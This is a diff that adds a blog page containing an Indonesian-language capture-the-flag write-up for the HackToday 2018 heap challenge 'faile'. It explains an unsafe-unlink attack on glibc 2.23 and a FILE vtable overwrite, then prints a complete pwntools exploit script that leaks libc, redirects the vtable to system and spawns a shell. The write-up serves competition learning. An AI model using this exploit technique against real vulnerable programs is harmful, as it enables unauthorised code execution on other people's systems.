@@ -1,0 +1,388 @@
+<!doctype html>
+
+<html lang="en-us">
+
+<head>
+  <title>Catousify</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="description" content="The HTML5 Herald" />
+  <meta name="author" content="kiror0" /><meta name="generator" content="Hugo 0.62.0" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.0/normalize.min.css" />
+  <script src="https://kit.fontawesome.com/b76b73e8e8.js" crossorigin="anonymous"></script>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Slab|Ruda" />
+  <link rel="stylesheet" type="text/css" href="http://zeroload.github.io/ctf/css/styles.css" /></head>
+
+<body>
+  <div id="container">
+    <header>
+      <h1>
+                <a href="http://zeroload.github.io/ctf/">Catousify</a>
+            </h1>
+
+      <ul id="social-media">
+        
+        
+          
+        <li><a href="https://github.com/kiror0"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a></li>
+           
+      </ul>
+      
+      <p><em>No Clever Tagline Needed.</em></p>
+      
+    </header>
+
+    
+<nav>
+    <ul>
+        
+        <li>
+            <a class="" href="http://zeroload.github.io/ctf/posts/">
+                <i class="fa-li fa  fa-lg"></i><span>Posts</span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="" href="http://zeroload.github.io/ctf/about/">
+                <i class="fa-li fa  fa-lg"></i><span>About Me</span>
+            </a>
+        </li>
+        
+    </ul>
+</nav>
+
+    <main>
+
+
+
+
+<article>
+
+    <h1>HackToday 2018 - faile</h1>
+
+    
+        <aside>
+    <ul>
+        <li>
+            <time class="post-date" datetime="2018-09-03T22:16:58Z">Sep 3, 2018</time>
+        </li>
+        
+        <li>
+            Categories:
+            <em>
+                
+                    
+                    <a href="http://zeroload.github.io/ctf/categories/pwn">pwn</a>
+                
+                    , 
+                    <a href="http://zeroload.github.io/ctf/categories/writeup">writeup</a>
+                
+            </em>
+        </li>
+        
+
+        
+
+        <li>5 minutes read</li>
+    </ul>
+</aside>
+
+    
+
+    <blockquote>
+<p>Downloads:</p>
+<p><a href="http://zeroload.github.io/ctf/assets/hacktoday/faile/faile">faile</a></p>
+<p><a href="http://zeroload.github.io/ctf/assets/hacktoday/faile/libc.so">libc.so</a></p>
+<p><a href="http://zeroload.github.io/ctf/assets/hacktoday/faile/solve.py">solve.py</a></p>
+</blockquote>
+<pre><code>$ ./faile
+┏━┳━━┳┳┳━━━━━━━━━━━━━━━━┳━━┳┳┳┓
+┃┏╋┓ ┗╋┛ ┏━╸┏━┓╹┃  ┏━┓ ┏╋┓ ┗╋┛┃
+┃┗╋┛ ┏╋┓ ┣━ ┏━┫┃┃  ┣━┛ ┗╋┛ ┏╋┓┃
+┃┏╋┓ ┗╋┛ ┃  ┗━┛┃┗━╸┗━┛ ┏╋┓ ┗╋┛┃
+┣┻┻┻━━┻━━━━━━━━━━━━━━━━┻┻┻━━┻━┫
+┃ PasteBin service. Now with  ┃
+┃ super secure id, but is it? ┃
+┃   -- by BabyHeap, Inc. --   ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+===========
+[1] Create
+[2] Edit
+[3] Delete
+[4] Print
+[5] Exit
+choice: ^C
+
+$ checksec ./faile
+[*] '/Challange/faile'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre><p>Sedikit info, terdapat beberapa unintended solution di soal ini karena <code>__malloc_hook</code> dkk. dapat di overwrite. Ini termasuk kesalahan dalam deploy soal di server. Tidak ada penyesuaian nilai poin yang diberikan untuk soal ini.</p>
+<p>Intended solution, analisa statik binary dan lakukan sedikit fuzzing pada input, akan ditemukan bug buffer overflow karena tidak ada pengecekan <code>(input size == malloc size)</code>. Dari sini ada beberapa skema bug untuk malloc mengembalikan arbitrary address. Pada solusi ini yang digunakan adalah <strong>unsafe unlink</strong> karena versi libc masih 2.23. Ok, pointer bisa dikontrol, lalu? <em>leak address</em> dapat dilakukan karena terdapat fungsi print data pada pointer (<code>choice(4)</code>).</p>
+<p><code>FULL-RELRO</code>, meskipun sudah memiliki write-where-what tidak bisa overwrite GOT table, terus gimana? Disini lah perannya struct file pointer dari <code>faile</code>. Sedikit penjelasan pada file pointer, <code>struct FILE</code> memiliki <code>struct _IO_jump_t</code> yang merupakan vtable untuk melakukan operasi file I/O seperti read, write, seek, close, dll. Pada vtable pointer inilah yang akan di overwrite untuk dapat mengontrol RIP/PC, pada kasus ini target adalah fungsi system untuk mendapatkan shell. Versi libc masih 2.23 jadi belum ada patch hardening file pointer yang melakukan <code>_IO_validate</code> sebelum &ldquo;<em>jump</em>&rdquo; ke vtable pointer dan gaperlu repot-repot mem-<em>bypass</em> fungsi check tersebut.</p>
+<p><strong>(cek referensi masih kalau belum jelas)</strong></p>
+<p>Full exlpoit,</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> sys<span style="color:#f92672">,</span> os
+
+<span style="color:#75715e"># (Tested on Ubuntu 16.04, GLIBC-2.23)</span>
+
+gdbcmd <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">b *0x00401254</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+<span style="color:#75715e"># context.terminal = &#39;kitty @ new-window --new-tab --tab-title pwn --keep-focus sh -c&#39;.split()</span>
+
+<span style="color:#66d9ef">if</span> sys<span style="color:#f92672">.</span>argv<span style="color:#f92672">.</span>__len__() <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span>:
+  r <span style="color:#f92672">=</span> remote(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>], int(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>]))
+<span style="color:#66d9ef">else</span>:
+  r <span style="color:#f92672">=</span> process(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>])
+  <span style="color:#75715e"># gdb.attach(r, gdbcmd)</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create</span>(size):
+  r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">choice: </span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">1</span><span style="color:#e6db74">&#39;</span>)
+  r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">id: </span><span style="color:#e6db74">&#39;</span>)
+  ID <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline(False)
+  r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">size: </span><span style="color:#e6db74">&#39;</span>, str(size))
+  <span style="color:#66d9ef">return</span> ID
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>(ID, content):
+  r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">choice: </span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">2</span><span style="color:#e6db74">&#39;</span>)
+  r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">id: </span><span style="color:#e6db74">&#39;</span>, ID)
+  r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">size: </span><span style="color:#e6db74">&#39;</span>, str(len(content)))
+  r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">text: </span><span style="color:#e6db74">&#39;</span>, content)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delete</span>(ID):
+  r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">choice: </span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">3</span><span style="color:#e6db74">&#39;</span>)
+  r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">id: </span><span style="color:#e6db74">&#39;</span>, ID)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_print</span>(ID):
+  r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">choice: </span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">4</span><span style="color:#e6db74">&#39;</span>)
+  r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">id: </span><span style="color:#e6db74">&#39;</span>, ID)
+  leak <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline(False)
+  log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">bin[{}] {}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(bins<span style="color:#f92672">.</span>index(ID), repr(leak)))
+  <span style="color:#66d9ef">return</span> leak
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_exit</span>():
+  r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">choice: </span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">5</span><span style="color:#e6db74">&#39;</span>)
+
+
+bins <span style="color:#f92672">=</span> [<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">10</span>
+
+<span style="color:#75715e"># Step 1: unsafe unlink</span>
+
+<span style="color:#75715e"># 0x00602020 bins[0]</span>
+<span style="color:#75715e"># 0x00602030 bins[1]</span>
+<span style="color:#75715e"># 0x00602040 bins[2]</span>
+<span style="color:#75715e"># 0x00602050 bins[3]</span>
+<span style="color:#75715e"># 0x00602060 bins[4]</span>
+<span style="color:#75715e"># 0x00602070 bins[5]</span>
+<span style="color:#75715e"># 0x00602080 bins[6]</span>
+<span style="color:#75715e"># 0x00602090 bins[7]</span>
+<span style="color:#75715e"># 0x006020a0 bins[8]</span>
+<span style="color:#75715e"># 0x006020b0 bins[9]</span>
+<span style="color:#75715e"># 0x006020c0 name</span>
+<span style="color:#75715e"># 0x006020.. ...</span>
+<span style="color:#75715e"># 0x006021c0 faile</span>
+
+bins[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> create(<span style="color:#ae81ff">0x80</span>)
+bins[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> create(<span style="color:#ae81ff">0x80</span>)
+bins[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> create(<span style="color:#ae81ff">0x80</span>)
+bins[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> create(<span style="color:#ae81ff">0x80</span>)
+bins[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> create(<span style="color:#ae81ff">0x80</span>)
+
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">bin[0] </span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> bins[<span style="color:#ae81ff">0</span>])
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">bin[1] </span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> bins[<span style="color:#ae81ff">1</span>])
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">bin[2] </span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> bins[<span style="color:#ae81ff">2</span>])
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">bin[3] </span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> bins[<span style="color:#ae81ff">3</span>])
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">bin[4] </span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> bins[<span style="color:#ae81ff">4</span>])
+
+payload  <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>)
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>)
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00602010</span>)
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00602018</span>)
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>)
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>)
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>)
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>)
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>)
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>)
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>)
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>)
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>)
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>)
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>)
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>)
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x80</span>)
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x90</span>)
+
+edit(bins[<span style="color:#ae81ff">0</span>], payload)
+delete(bins[<span style="color:#ae81ff">1</span>])
+
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">bin[0] now should be pointing to 0x602010</span><span style="color:#e6db74">&#39;</span>)
+
+<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">[+] Starting local process </span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/Challanges/faile</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: pid 1683</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">[*] bin[0] 697deecef99bfcff</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">[*] bin[1] 029f610bcdc347ab</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">[*] Switching to interactive mode</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">|--&gt; 697deecef99bfcff, 0x602010 &lt;-- controlled</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">|--&gt; 0000000000000000, (nil)</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">|--&gt; 0000000000000000, (nil)</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">|--&gt; 0000000000000000, (nil)</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">|--&gt; 0000000000000000, (nil)</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">|--&gt; 0000000000000000, (nil)</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">|--&gt; 0000000000000000, (nil)</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">|--&gt; 0000000000000000, (nil)</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">|--&gt; 0000000000000000, (nil)</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">|--&gt; 0000000000000000, (nil)</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">===========</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">[1] Create</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">[2] Edit</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">[3] Delete</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">[4] Print</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">[5] Exit</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+
+<span style="color:#75715e"># Step 2: leak, overwrite File Pointer</span>
+
+PUTS_GOT <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00601f80</span>
+
+payload  <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>)
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>)
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(int(bins[<span style="color:#ae81ff">0</span>], <span style="color:#ae81ff">16</span>))
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(PUTS_GOT)   <span style="color:#75715e"># reloc.puts</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(int(bins[<span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">16</span>))
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x006020c0</span>) <span style="color:#75715e"># fake _IO_jump_t</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(int(bins[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">16</span>))
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x006021c0</span>) <span style="color:#75715e"># faile</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(int(bins[<span style="color:#ae81ff">3</span>], <span style="color:#ae81ff">16</span>))
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00602050</span>) <span style="color:#75715e"># (void*) faile</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(int(bins[<span style="color:#ae81ff">4</span>], <span style="color:#ae81ff">16</span>))
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00602060</span>) <span style="color:#75715e"># &amp;_IO_jump_t</span>
+edit(bins[<span style="color:#ae81ff">0</span>], payload)
+
+libc_puts <span style="color:#f92672">=</span> _print(bins[<span style="color:#ae81ff">0</span>])
+libc_puts <span style="color:#f92672">=</span> u64(libc_puts<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+libc_base <span style="color:#f92672">=</span> libc_puts <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x6f690</span>
+system  <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x45390</span>
+
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">LIBC_LEAK </span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> hex(libc_puts))
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">LIBC_BASE </span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> hex(libc_base))
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">SYSTEM    </span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> hex(system))
+
+faile <span style="color:#f92672">=</span> _print(bins[<span style="color:#ae81ff">2</span>])
+faile <span style="color:#f92672">=</span> u64(faile<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">FAILE </span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> hex(faile))
+
+payload  <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(int(bins[<span style="color:#ae81ff">3</span>], <span style="color:#ae81ff">16</span>))
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(faile)
+edit(bins[<span style="color:#ae81ff">3</span>], payload)
+
+payload  <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#e6db74">&#39;</span>
+edit(bins[<span style="color:#ae81ff">3</span>], payload)
+
+payload  <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(int(bins[<span style="color:#ae81ff">4</span>], <span style="color:#ae81ff">16</span>))
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(faile <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xd8</span>)
+edit(bins[<span style="color:#ae81ff">4</span>], payload)
+
+_io_jump_t <span style="color:#f92672">=</span> _print(bins[<span style="color:#ae81ff">4</span>])
+_io_jump_t <span style="color:#f92672">=</span> u64(_io_jump_t<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">_IO_jump  </span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> hex(_io_jump_t))
+
+payload <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x006020c0</span>)
+edit(bins[<span style="color:#ae81ff">4</span>], payload) <span style="color:#75715e"># _IO_jump_t -&gt; fake _IO_jump_t</span>
+
+<span style="color:#75715e"># spray</span>
+payload  <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># size_t_dummy</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># size_t_dummy2</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x401297</span>) <span style="color:#75715e"># _IO_finish_t</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(system) <span style="color:#75715e"># _IO_overflow_t</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(system) <span style="color:#75715e"># _IO_underflow_t</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(system) <span style="color:#75715e"># _IO_underflow_t</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(system) <span style="color:#75715e"># _IO_pbackfail_t</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(system) <span style="color:#75715e"># _IO_xsputn_t</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(system) <span style="color:#75715e"># _IO_xsgetn_t</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(system) <span style="color:#75715e"># _IO_seekoff_t</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(system) <span style="color:#75715e"># _IO_seekpos_t</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(system) <span style="color:#75715e"># _IO_setbuf_t</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(system) <span style="color:#75715e"># _IO_sync_t</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(system) <span style="color:#75715e"># _IO_doallocate_t</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(system) <span style="color:#75715e"># _IO_read_t</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(system) <span style="color:#75715e"># _IO_write_t</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(system) <span style="color:#75715e"># _IO_seek_t</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(system) <span style="color:#75715e"># _IO_close_t</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(system) <span style="color:#75715e"># _IO_stat_t</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(system) <span style="color:#75715e"># _IO_showmanyc_t</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(system) <span style="color:#75715e"># _IO_imbue_t</span>
+edit(bins[<span style="color:#ae81ff">1</span>], payload)
+
+_exit()
+
+r<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>Referensi:</p>
+<ul>
+<li><a href="https://github.com/shellphish/how2heap">https://github.com/shellphish/how2heap</a></li>
+<li><a href="https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/">https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/</a></li>
+<li><a href="https://www.w0lfzhang.com/2016/11/19/File-Stream-Pointer-Overflow/">https://www.w0lfzhang.com/2016/11/19/File-Stream-Pointer-Overflow/</a></li>
+</ul>
+
+
+</article>
+
+
+<section class="post-nav">
+    <ul>
+        
+        <li>
+            <a href="http://zeroload.github.io/ctf/posts/hacktoday-2018-kompeni-pemberantas-korupsi-editorial/"><i class="fa fa-chevron-circle-left"></i> HackToday 2018 - Kompeni Pemberantas Korupsi</a>
+        </li>
+        
+        
+        <li>
+            <a href="http://zeroload.github.io/ctf/posts/hacktoday-2018-not-a-game/">HackToday 2018 - not /a/game <i class="fa fa-chevron-circle-right"></i> </a>
+        </li>
+        
+    </ul>
+</section>
+    
+
+
+
+
+
+</main>
+    <footer>
+        <h6>Copyright © 2019 - kiror0 |
+            Rendered by <a href="https://gohugo.io" title="Hugo">Hugo</a> |
+            <a href="http://zeroload.github.io/ctf/index.xml">Subscribe</a></h6>
+    </footer>
+</div>
+<script src="http://zeroload.github.io/ctf/js/scripts.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-146594173-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+</body>
+
+</html>
